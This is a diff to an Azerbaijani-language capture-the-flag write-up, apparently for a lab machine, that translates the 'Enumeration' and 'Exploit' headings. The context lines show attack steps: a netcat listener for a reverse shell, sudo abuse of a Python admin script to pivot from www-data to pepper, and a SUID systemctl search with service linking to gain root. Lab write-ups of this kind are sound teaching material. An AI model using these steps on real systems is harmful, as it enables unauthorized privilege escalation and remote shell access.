@@ -254,7 +254,7 @@ export TERM=xterm
 
 ## Üfüqi Yerdəyişmə (www-data → pepper)
 
-### Enumeration
+### Sadalanma
 
 ```bash
 sudo -l
@@ -301,7 +301,7 @@ cat /tmp/shell.sh
 nc -lvnp 4445
 ```
 
-### Exploit
+### İstismar
 
 ```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -333,7 +333,7 @@ cat /home/pepper/user.txt
 
 ## Səlahiyyətlərin Artırılması (pepper → root)
 
-### Enumeration
+### Sadalanma
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null | grep systemctl
@@ -370,7 +370,7 @@ EOF
 nc -lvnp 4445
 ```
 
-### Exploit
+### İstismar
 
 ```bash
 /bin/systemctl link /home/pepper/root.service
